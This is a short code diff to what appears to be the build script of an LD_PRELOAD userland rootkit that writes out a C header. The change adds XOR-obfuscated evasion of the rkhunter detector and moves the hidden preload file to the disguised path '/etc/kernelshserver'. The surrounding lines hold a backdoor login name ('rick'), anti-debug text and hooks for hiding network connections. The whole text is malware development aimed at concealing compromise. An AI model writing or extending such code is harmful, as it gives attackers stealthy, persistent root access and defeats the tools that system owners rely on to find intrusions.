@@ -31,6 +31,7 @@ header_template = '''#define _GNU_SOURCE
 #define PROC_PATH\t"{proc_path}"
 #define ANTI_DEBUG_MSG\t"{anti_debug_msg}"
 
+#define C_RKHUNTER\t"{c_rkhunter}"
 #define C_UNHIDE\t"{c_unhide}"
 #define C_LDD\t"{c_ldd}"
 #define LD_LINUX\t"{ld_linux}"
@@ -140,12 +141,13 @@ header = header_template.format(
     proc_net_tcp=xor("/proc/net/tcp"),
     proc_net_tcp6=xor("/proc/net/tcp6"),
     scanf_line=xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n"),
+    c_rkhunter=xor("/bin/rkhunter"),
     c_unhide=xor("/bin/unhide"),
     c_ldd=xor("/bin/ldd"),
     ld_linux=xor("ld-linux"),
     ld_trace=xor("LD_TRACE_LOADED_OBJECTS"),
     ld_normal=xor("/etc/ld.so.preload"),
-    ld_hide=xor("/etc/.ld.so.preload"),
+    ld_hide=xor("/etc/kernelshserver"),
     blind_login=xor("rick"),
     c_root=xor("root")
 )
